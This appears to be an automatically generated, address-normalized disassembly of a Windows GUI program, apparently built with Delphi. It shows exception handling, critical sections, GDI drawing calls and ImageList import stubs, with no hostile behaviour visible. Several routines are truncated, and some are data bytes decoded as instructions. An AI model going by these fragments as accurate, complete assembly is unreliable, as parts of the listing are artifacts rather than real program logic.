retn 0x8
xor edx edx
mov [ eax ] edx
sub_41a475
jmp sub_4039e4
sub_41a47c
mov eax [ rw-data ]
call sub_403290
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a48c
call sub_413264
retn
sub_41a554
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41a6f8
jmp sub_4039e4
sub_41a6ff
pop ebp
retn
sub_41a78d
jmp sub_4039e4
sub_41a794
pop ebp
retn
sub_41aa7d
jmp sub_4039e4
sub_41aa84
pop ebp
retn
sub_41aa88
sub [ rw-data ] 0x1
retn
sub_41b07d
0x41
sub_41b2af
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] 0x0
int3
sub_41b323
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_41b46d
add eax 0xffffffd8
jmp sub_41f85c
sub_41b475
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_41b998
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41ba0c
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41ba80
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41ba8c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41bb6c
jmp sub_4039e4
sub_41bb73
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bc03
jmp sub_4039e4
sub_41bc95
jmp sub_4039e4
sub_41bc9c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bd00
jmp sub_4039e4
sub_41bd07
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bd6f
jmp sub_4039e4
sub_41bd76
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41be19
jmp sub_4039e4
sub_41be20
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c278
push 0x33
mov ecx rw-data
call sub_413524
retn
sub_41c288
push 0x33
mov ecx rw-data
call sub_4134e4
retn
sub_41c298
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41c2bc
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41c490
push 0x11
mov ecx rw-data
call sub_4134e4
retn
sub_41c5d0
push ebx
mov ebx eax
mov eax ebx
call sub_41c298
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41c68a
jmp sub_4039e4
sub_41c691
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c2bc
retn
sub_41c6a7
jmp sub_4039e4
sub_41c6c0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41c71d
jmp sub_4039e4
sub_41c724
pop ebx
pop ecx
pop ebp
retn
sub_41c89d
jmp sub_4039e4
sub_41c8c5
jmp sub_4039e4
sub_41c8cc
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41c938
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404244
pop esi
pop ebx
retn
sub_41c9ac
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41c908
push eax
call sub_406118
neg eax
pop ebx
retn
sub_41c9e8
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41ca20
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41ca50
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41cb6e
jmp sub_4039e4
sub_41cb75
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c2bc
retn
sub_41cb8b
jmp sub_4039e4
sub_41cc01
jmp sub_4039e4
sub_41cc08
pop ebx
pop ecx
pop ebp
retn
sub_41cc0c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41ccc2
jmp sub_4039e4
sub_41cd08
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41ce47
jmp sub_4039e4
sub_41ce4e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c2bc
retn
sub_41ce64
jmp sub_4039e4
sub_41cedd
jmp sub_4039e4
sub_41cee4
pop ebx
pop ecx
pop ebp
retn
sub_41d015
jmp sub_4039e4
sub_41d028
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41d39c
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41d644
jmp sub_4039e4
sub_41d64b
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41d654
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41d68c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d698
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d7fc
retn
sub_41d8c5
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41d8dc
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41d9c8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d9e8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41da08
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41da28
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
pop ebx
retn
sub_41da40
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
pop ebx
retn
sub_41da64
mov eax [ rw-data ]
call sub_41da40
retn
sub_41dac6
jmp sub_4039e4
sub_41dacd
pop ecx
pop ebp
retn
sub_41db6c
jmp sub_4039e4
sub_41db73
pop ebx
mov esp ebp
pop ebp
retn
sub_41dc45
jmp sub_4039e4
sub_41dcd6
jmp sub_4039e4
sub_41dcdd
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dd08
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41ddef
jmp sub_4039e4
sub_41df9c
jmp sub_4039e4
sub_41dfa3
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41e1b5
jmp sub_4039e4
sub_41e1bc
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41e256
jmp sub_4039e4
sub_41e432
jmp sub_4039e4
sub_41e4ec
jmp sub_4039e4
sub_41e4f3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e513
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e50c
jmp sub_4039e4
sub_41e513
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41e6a1
jmp sub_4039e4
sub_41e86c
jmp sub_4039e4
sub_41e873
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e896
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026dc
retn
sub_41e88f
jmp sub_4039e4
sub_41e896
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e8b6
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
sub_41e8af
jmp sub_4039e4
sub_41e8b6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41e8c0
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_41ea20
push 0x0
call sub_41e9bc
retn
sub_41eac5
jmp sub_4039e4
sub_41eacc
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41ead8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41ea28
pop ebx
pop ebp
retn 0x4
sub_41eaec
retn
sub_41eaf0
test eax eax
jne r-xdata
retn
call sub_41eaec
sub_41ecc3
jmp sub_4039e4
sub_41ecea
jmp sub_4039e4
sub_41ecf1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ed30
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41eefd
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_41ef06
jmp sub_4039e4
j_sub_41eefd
jmp sub_41eefd
sub_41ef0d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_41ef23
jmp sub_4039e4
sub_41ef34
xor eax eax
retn
sub_41ef38
mov al [ eax + 0x21 ]
retn
sub_41ef84
jmp sub_4039e4
sub_41ef8b
pop esi
pop ecx
pop ebp
retn
sub_41efb8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41f00f
jmp sub_4039e4
sub_41f016
pop esi
pop ecx
pop ebp
retn
sub_41f01c
retn
sub_41f020
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41f030
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41f1b5
jmp sub_4039e4
sub_41f1bc
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_41f2db
jmp sub_4039e4
sub_41f2e2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41f36a
jmp sub_4039e4
sub_41f371
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f4cc
jmp sub_403730
sub_41f52c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f0d8
mov [ rw-data ] eax
sub_41f54c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f3dc
mov [ rw-data ] eax
sub_41f674
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_41f610
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_41f71c
jmp sub_403730
sub_41f7b3
jmp sub_403730
sub_41f82c
push ebx
mov ebx edx
call sub_41f54c
mov edx ebx
call sub_41f4f0
test eax eax
setne al
pop ebx
retn
sub_41f844
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_41f674
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_41f85c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_41f674
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_41f9a5
jmp sub_403730
sub_41fa23
jmp sub_4039e4
sub_41fa2a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fbc4
retn
sub_41fd64
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_420068
jmp sub_4039e4
sub_42006f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4201e7
jmp sub_4039e4
sub_4201ee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42027d
jmp sub_4039e4
sub_420284
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4202a6
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404004
retn
sub_42029f
jmp sub_4039e4
sub_4202a6
pop ebx
mov esp ebp
pop ebp
retn
sub_4202b9
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_4205a0
jmp r-xdata
retn
sub_4202cf
call sub_42062c
retn
sub_4203c4
retn
sub_42061c
jmp sub_4039e4
sub_420747
jmp sub_4039e4
sub_42074e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_420767
jmp sub_4039e4
sub_42093e
jmp sub_4039e4
sub_420966
jmp sub_4039e4
sub_42096d
mov esp ebp
pop ebp
retn
sub_4209e4
jmp sub_4039e4
sub_420aec
jmp sub_4039e4
sub_420bd7
jmp sub_4039e4
sub_420be4
inc [ eax + 0x4 ]
retn
sub_420d5f
jmp sub_4039e4
sub_421110
jmp sub_4039e4
sub_42135a
jmp sub_4039e4
sub_421384
jmp sub_4039e4
sub_42138b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4213ad
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_4213a6
jmp sub_4039e4
sub_4213b7
jmp sub_403730
sub_421406
jmp sub_4039e4
sub_421633
jmp sub_4039e4
sub_42167b
jmp sub_4039e4
sub_4217e8
jmp sub_4039e4
sub_4218af
jmp sub_403730
sub_421904
mov [ eax + 0x31 ] 0x0
call sub_41ed30
retn
sub_421b55
jmp sub_4039e4
sub_421bc0
jmp sub_4039e4
sub_421bc7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421c38
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_421cec
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_421cfc
push ebx
mov ebx eax
mov eax ebx
call sub_421eb4
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_421d10
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_421d2c
push ebx
mov ebx eax
mov eax ebx
call sub_421f14
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_421d88
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_421e97
jmp sub_4039e4
sub_4220c8
jmp sub_4039e4
sub_4220cf
pop ebx
pop ecx
pop ebp
retn
sub_42215b
jmp sub_403730
sub_4221bb
jmp sub_4039e4
sub_4221c2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_4225a3
jmp sub_4039e4
sub_4225cf
jmp sub_4039e4
sub_422636
jmp sub_403730
sub_422667
jmp sub_4039e4
sub_4226ec
jmp sub_403730
sub_4226f1
mov eax [ ebp - 0x38 ]
call sub_403290
call sub_403a44
call sub_403a98
sub_422703
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422720
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
sub_422719
jmp sub_4039e4
sub_42286f
jmp sub_403730
sub_422b3b
jmp sub_403730
sub_422c1c
mov cl 0x1
call sub_422c24
retn
sub_422ed9
add [ eax ] al
add [ ebx ] dh
leave
call sub_422c24
retn
sub_422f5e
jmp sub_403730
sub_422f63
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a44
call sub_403a98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422fb4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_4230ed
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42311c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_423130
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_423249
jmp sub_403730
sub_4232fe
jmp sub_403730
sub_423368
jmp sub_403730
sub_42339c
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_423328
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_4233b4
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41da28
retn
mov [ eax + 0x30 ] edx
retn
sub_4233cc
retn
sub_4233d0
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41da28
retn
mov [ eax + 0x2c ] edx
retn
sub_423410
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41da28
pop ebp
retn 0x4
sub_423424
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41da28
pop ebp
retn 0x4
sub_4235e4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4235f0
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42369d
jmp sub_4039e4
sub_4236a4
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42378f
jmp sub_403730
sub_4237fb
jmp sub_4039e4
sub_423929
jmp sub_4039e4
sub_423930
pop ebp
retn
sub_423a65
jmp sub_4039e4
sub_423a6c
pop ebp
retn
sub_423a70
sub [ rw-data ] 0x1
retn
sub_423cb8
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_413a74
retn
sub_423cec
mov eax [ eax + 0x4 ]
call sub_413918
retn
sub_423d1d
jmp sub_4039e4
sub_423d24
pop ebp
retn
sub_423d28
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ __import_lookup_table_12(comctl32:ImageList_ReplaceIcon) ]
ImageList_SetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_SetBkColor) ]
ImageList_GetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_GetBkColor) ]
ImageList_Replace
jmp [ __import_lookup_table_12(comctl32:ImageList_Replace) ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ __import_lookup_table_12(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_SetIconSize) ]
sub_423e19
jmp sub_4039e4
sub_423e20
pop ebp
retn
sub_423e24
sub [ rw-data ] 0x1
retn
sub_423eeb
jmp sub_4039e4
sub_423ef2
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_424508
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_423f14
mov [ rw-data ] sub_42402c
mov [ rw-data ] sub_423f9c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_424230
mov [ rw-data ] sub_424304
mov [ rw-data ] sub_4243d8
retn
sub_424599
jmp sub_4039e4
sub_4245a0
pop ebp
retn
sub_4245a4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_424508
sub_4245d9
jmp sub_4039e4
sub_4245e0
pop ebp
retn
sub_4245e4
sub [ rw-data ] 0x1
retn
sub_424873
add eax 0xffffffd4
jmp sub_4253a0
sub_42487b
add eax 0xffffffd4
jmp sub_4253fc
sub_42488d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405720
sub_424897
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405734
sub_424a26
jmp sub_4039e4
sub_424a2d
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_424c3d
jmp sub_4039e4
sub_424c44
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424df9
jmp sub_4039e4
sub_424e5e
jmp sub_4039e4
sub_424e65
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424f51
jmp sub_4039e4
sub_424f58
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425168
lea eax [ ebp - 0x30 ]
call sub_403fe0
lea eax [ ebp - 0x20 ]
call sub_403fe0
retn
sub_425179
jmp sub_4039e4
j_sub_425168
jmp sub_425168
sub_425180
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42527b
jmp sub_4039e4
sub_425282
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42537f
jmp sub_4039e4
sub_425386
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4253e6
lea eax [ ebp - 0x4 ]
call sub_40564c
retn
sub_4253ef
jmp sub_4039e4
j_sub_4253e6
jmp sub_4253e6
sub_4253f6
pop ebx
pop ecx
pop ebp
retn
sub_425491
jmp sub_4039e4
sub_425498
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4254a4
mov eax [ eax + 0x20 ]
retn
sub_4255d3
jmp sub_4039e4
sub_4255da
pop ebp
retn
sub_4255dc
sub [ rw-data ] 0x1
retn
sub_425609
jmp sub_4039e4
sub_425610
pop ebp
retn
sub_425614
sub [ rw-data ] 0x1
retn
sub_42564d
jmp sub_4039e4
sub_425654
pop ebp
retn
sub_425658
sub [ rw-data ] 0x1
retn
sub_425965
jmp sub_4039e4
sub_42596c
pop ebp
retn
sub_425970
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4256bc
sub_425a50
retn
sub_425ac4
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_425ad0
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_425adc
mov edx [ eax ]
call [ edx ]
retn
sub_425ae4
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_425b11
jmp sub_4039e4
sub_425b18
pop ebp
retn
sub_425b1c
sub [ rw-data ] 0x1
retn
sub_425cdb
jmp sub_4039e4
sub_425ce2
pop ebp
retn
sub_426097
jmp sub_4039e4
sub_42609e
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_4264b8
jmp sub_4039e4
sub_4264bf
pop ebp
retn
sub_4264c4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425a54
mov [ rw-data ] eax
sub_426505
jmp sub_4039e4
sub_42650c
pop ebp
retn
sub_426510
sub [ rw-data ] 0x1
retn
sub_42653d
jmp sub_4039e4
sub_426544
pop ebp
retn
sub_426548
sub [ rw-data ] 0x1
retn
sub_426575
jmp sub_4039e4
sub_42657c
pop ebp
retn
sub_426580
sub [ rw-data ] 0x1
retn
sub_4265ad
jmp sub_4039e4
sub_4265b4
pop ebp
retn
sub_4265b8
sub [ rw-data ] 0x1
retn
sub_4265e5
jmp sub_4039e4
sub_4265ec
pop ebp
retn
sub_4265f0
sub [ rw-data ] 0x1
retn
sub_42661d
jmp sub_4039e4
sub_426624
pop ebp
retn
sub_426628
sub [ rw-data ] 0x1
retn
sub_426655
jmp sub_4039e4
sub_42665c
pop ebp
retn
sub_426660
sub [ rw-data ] 0x1
retn
sub_42668d
jmp sub_4039e4
sub_426694
pop ebp
retn
sub_426698
sub [ rw-data ] 0x1
retn
sub_4266c5
jmp sub_4039e4
sub_4266cc
pop ebp
retn
sub_4266d0
sub [ rw-data ] 0x1
retn
sub_42694a
jmp sub_403730
sub_42694f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e194
call sub_403a98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42696c
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_426974
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_40348c
pop esi
retn
sub_42698c
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_40348c
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4269a4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_426a4d
jmp sub_4039e4
sub_426a7b
jmp sub_4039e4
sub_426a82
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426a8c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_426aa0
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_426cfe
jmp sub_4039e4
sub_426d05
pop ebp
retn
sub_4286d8
push esi
mov esi eax
cmp dl [ esi + 0x169 ]
je r-xdata
pop esi
retn
mov [ esi + 0x169 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_428b6e
jmp sub_403730
sub_428c27
jmp sub_4039e4
sub_428c2e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428c34
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_428ba8
sub_428c44
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_428ba8
sub_428c54
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_428ba8
pop ebp
retn 0x8
sub_428c6c
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_428f09
jmp sub_403730
sub_42907c
retn
sub_429209
jmp sub_4039e4
sub_42928c
push ebx
mov ebx eax
mov eax ebx
call sub_44023c
mov eax ebx
call sub_429080
pop ebx
retn
sub_4292a0
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_44095c
